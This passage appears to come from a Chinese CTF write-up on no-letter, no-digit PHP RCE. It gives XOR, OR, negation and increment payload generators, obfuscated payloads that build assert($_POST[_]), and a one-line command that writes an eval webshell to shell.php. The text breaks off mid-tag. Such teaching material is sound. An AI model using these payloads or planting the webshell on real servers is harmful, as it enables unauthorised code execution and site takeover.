class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>都是异或脚本</p><p>例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//简单例题，flag再phpinfo()中，需要执行php命令：phpinfo();</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$mess</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;mess&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z]/&quot;</span>,<span class="variable">$mess</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;invalid input!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$mess</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//构造payload,字符串phpinfo异或结果为&quot;0302181&quot;^&quot;@[@[_^^&quot;</span></span><br><span class="line"> </span><br><span class="line">mess=<span class="variable">$_</span>=<span class="string">&quot;0302181&quot;</span>^<span class="string">&quot;@[@[_^^&quot;</span>;<span class="variable">$_</span>();</span><br></pre></td></tr></table></figure><h3 id="或绕过"><a href="#或绕过" class="headerlink" title="或绕过"></a>或绕过</h3><p>原理和异或绕过类似，只不过用的是|运算符。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">hex_i = <span class="string">&quot;&quot;</span></span><br><span class="line">hex_j = <span class="string">&quot;&quot;</span></span><br><span class="line">pattern=<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>   <span class="comment">#正则过滤的内容</span></span><br><span class="line">str1=[<span class="string">&quot;system&quot;</span>,<span class="string">&quot;dir&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    t1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    t2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> str1[p]:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                <span class="keyword">if</span> re.search(pattern,<span class="built_in">chr</span>(i)) :</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> re.search(pattern,<span class="built_in">chr</span>(j)) :</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> i &lt; <span class="number">16</span>:</span><br><span class="line">                    hex_i = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    hex_i=<span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">if</span> j &lt; <span class="number">16</span>:</span><br><span class="line">                    hex_j=<span class="string">&quot;0&quot;</span>+<span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    hex_j=<span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">                hex_i=<span class="string">&#x27;%&#x27;</span>+hex_i</span><br><span class="line">                hex_j=<span class="string">&#x27;%&#x27;</span>+hex_j</span><br><span class="line">                c=<span class="built_in">chr</span>(<span class="built_in">ord</span>(urllib.parse.unquote(hex_i))|<span class="built_in">ord</span>(urllib.parse.unquote(hex_j)))</span><br><span class="line">                <span class="keyword">if</span>(c ==k):</span><br><span class="line">                    t1=t1+hex_i</span><br><span class="line">                    t2=t2+hex_j</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(\&quot;&quot;</span>+t1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+t2+<span class="string">&quot;\&quot;)&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="自增绕过"><a href="#自增绕过" class="headerlink" title="自增绕过"></a>自增绕过</h3><p>在编程中，自增操作是指将一个变量的值增加1</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$number</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$number</span>++;  <span class="comment">// 自增操作</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$number</span>;  <span class="comment">// 输出 11</span></span><br></pre></td></tr></table></figure><p>自增操作也可以应用于字母</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$letter = &#x27;a&#x27;;</span><br><span class="line">$letter++;  // 自增操作</span><br><span class="line">echo $letter;  // 输出 &#x27;b&#x27;</span><br></pre></td></tr></table></figure><p>‘a’++ &#x3D;&gt; ‘b’，’b’++ &#x3D;&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。</p><p>那么，如何拿到一个值为字符串’a’的变量呢？</p><p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//测试发现7.0.12以上版本不可使用</span><br><span class="line">//使用时需要url编码下</span><br><span class="line">$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</span><br><span class="line">固定格式 构造出来的 assert($_POST[_]);</span><br><span class="line">然后post传入   _=phpinfo();</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一样的：</span><br><span class="line">&lt;?php</span><br><span class="line">$_=[].&#x27;&#x27;;   //得到&quot;Array&quot;</span><br><span class="line">$___ = $_[$__];   //得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___=&quot;A&quot;</span><br><span class="line">$__ = $___;   //$__=&quot;A&quot;</span><br><span class="line">$_ = $___;   //$_=&quot;A&quot;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到&quot;S&quot;，此时$__=&quot;S&quot;</span><br><span class="line">$___ .= $__;   //$___=&quot;AS&quot;</span><br><span class="line">$___ .= $__;   //$___=&quot;ASS&quot;</span><br><span class="line">$__ = $_;   //$__=&quot;A&quot;</span><br><span class="line">$__++;$__++;$__++;$__++;   //得到&quot;E&quot;，此时$__=&quot;E&quot;</span><br><span class="line">$___ .= $__;   //$___=&quot;ASSE&quot;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__;$__++;   //得到&quot;R&quot;，此时$__=&quot;R&quot;</span><br><span class="line">$___ .= $__;   //$___=&quot;ASSER&quot;</span><br><span class="line">$__++;$__++;   //得到&quot;T&quot;，此时$__=&quot;T&quot;</span><br><span class="line">$___ .= $__;   //$___=&quot;ASSERT&quot;</span><br><span class="line">$__ = $_;   //$__=&quot;A&quot;</span><br><span class="line">$____ = &quot;_&quot;;   //$____=&quot;_&quot;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到&quot;P&quot;，此时$__=&quot;P&quot;</span><br><span class="line">$____ .= $__;   //$____=&quot;_P&quot;</span><br><span class="line">$__ = $_;   //$__=&quot;A&quot;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到&quot;O&quot;，此时$__=&quot;O&quot;</span><br><span class="line">$____ .= $__;   //$____=&quot;_PO&quot;</span><br><span class="line">$__++;$__++;$__++;$__++;   //得到&quot;S&quot;，此时$__=&quot;S&quot;</span><br><span class="line">$____ .= $__;   //$____=&quot;_POS&quot;</span><br><span class="line">$__++;   //得到&quot;T&quot;，此时$__=&quot;T&quot;</span><br><span class="line">$____ .= $__;   //$____=&quot;_POST&quot;</span><br><span class="line">$_ = $$____;   //$_=$_POST</span><br><span class="line">$___($_[_]);   //ASSERT($POST[_])</span><br></pre></td></tr></table></figure><h3 id="输出重定向："><a href="#输出重定向：" class="headerlink" title="输出重定向："></a>输出重定向：</h3><p><img src="https://bu.dusays.com/2024/05/13/664161cf568c7.png" alt="image-20240329223733390"></p><p>可以写马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo -e &quot;&lt;?php @eval(\$_POST[&#x27;test&#x27;]);?&gt;&quot; &gt; shell.php</span><br></pre></td></tr></table></figure><h2 id="无字母数字RCE"><a href="#无字母数字RCE" class="headerlink" title="无字母数字RCE"></a>无字母数字RCE</h2><p>[工具](<a href="https://github.com/ProbiusOfficial/bashFuck">ProbiusOfficial&#x2F;bashFuck: exec BashCommand with only ! # $ ‘ ( ) &lt; \ { } just 10 charset used in Bypass or CTF (github.com)</a>)</p><h3 id="例1："><a href="#例1：" class="headerlink" title="例1："></a>例1：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/i&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>异或、取反、自增、临时文件上传；都可以</strong></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>首先，明确思路。我的核心思路是，将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如“assert”，然后动态执行之即可。</p><p>那么，<strong>变换方法</strong> 将是解决本题的要点。</p><p>不过在此之前，我需要说说php5和7的差异。</p><p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p><p>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p><p>下文为了方便起见，使用PHP5作为环境</p><h4 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h4><p>这是最简单、最容易想到的方法。在PHP中，两个字符串执行<strong>异或</strong>操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); <span class="comment">// $_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); <span class="comment">// $__=&#x27;_POST&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure><p>其实很像自增的感觉</p><p><img src="https://bu.dusays.com/2024/05/13/664161d2c756d.png" alt="image-20240331113232883"></p><h4 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h4><p><strong>取反</strong></p><p>用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;&#123;2&#125;</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code>：</p><p><img src="https://bu.dusays.com/2024/05/13/664161ceb2bb5.png" alt="image-20240331113325366"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;的&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;半&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;始&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$___</span>=<span class="string">&quot;俯&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;次&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;站&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$_____</span>;</span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$_</span>[<span class="variable">$__</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161d2cb76a.png" alt="image-20240331113423181"></p><p><strong>这个答案还利用了PHP的弱类型特性。因为要获取<code>&#39;和&#39;&#123;2&#125;</code>，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>。</strong></p><h4 id="法3"><a href="#法3" class="headerlink" title="法3"></a>法3</h4><p><strong>自增</strong></p><p><img src="https://bu.dusays.com/2024/05/13/664161ce2bcf0.png" alt="image-20240331113605706"></p><p>也就是说，<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>… 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>：</p><p><img src="https://bu.dusays.com/2024/05/13/664161ceb9709.png" alt="image-20240331113652179"></p><p>再取这个字符串的第一个字母，就可以获得’A’了。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161d2ef00f.png" alt="image-20240331113925903"></p><h3 id="例2-进阶-："><a href="#例2-进阶-：" class="headerlink" title="例2(进阶)："></a>例2(进阶)：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据上题 其中有两个主要的思路：</p><ol><li>利用位运算</li><li>利用自增运算符</li></ol><p>相较于正常的(上面的)无字母数字RCE </p><p>这道题多了两个限制：</p><ol><li>webshell长度不超过35位</li><li>除了不包含字母数字，还不能包含<code>$</code>和<code>_</code></li></ol><p>因为<code>$</code>不能使用了，所以我们无法构造PHP中的变量 所以上述方法无法进行</p><p>所以 这里其实有一种新方法</p><p>这里重点说一下<strong>临时文件上传</strong></p><h4 id="PHP7下简单解决"><a href="#PHP7下简单解决" class="headerlink" title="PHP7下简单解决"></a>PHP7下简单解决</h4><p>我们将上述代码放在index.php中，然后执行<code>docker run --rm -p 9090:80 -v </code>pwd<code>:/var/www/html php:7.2-apache</code>，启动一个php 7.2的服务器。</p><p>php7中修改了表达式执行的<a href="http://php.net/manual/zh/migration70.incompatible.php">顺序</a>：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cf90a8a.png" alt="image-20240331120445300"></p><p>PHP7前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式。</p><p>所以很简单了，构造一个可以生成<code>phpinfo</code>这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161d08c7ce.png" alt="image-20240331120819058"></p><h4 id="PHP5下理解"><a href="#PHP5下理解" class="headerlink" title="PHP5下理解"></a>PHP5下理解</h4><h5 id="PHP5下思考"><a href="#PHP5下思考" class="headerlink" title="PHP5下思考"></a>PHP5下思考</h5><p>我们使用<code>docker run --rm -p 9090:80 -v </code>pwd<code>:/var/www/html php:5.6-apach</code>来运行一个php5.6的web环境。</p><p>此时，我们尝试用PHP7的payload，将会得到一个错误：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cf5c597.png" alt="image-20240331120800881"></p><p>原因就是php5并不支持这种表达方式。</p><p>大部分语言都不会是单纯的逻辑语言，一门全功能的语言必然需要和操作系统进行交互。操作系统里包含的最重要的两个功能就是“shell（系统命令）”和“文件系统”，很多木马与远控其实也只实现了这两个功能。</p><p>PHP自然也能够和操作系统进行交互，“反引号”就是PHP中最简单的执行shell的方法。那么，在使用PHP无法解决问题的情况下，为何不考虑用“反引号”+“shell”的方式来getshell呢？</p><h5 id="PHP5-shell打破禁锢"><a href="#PHP5-shell打破禁锢" class="headerlink" 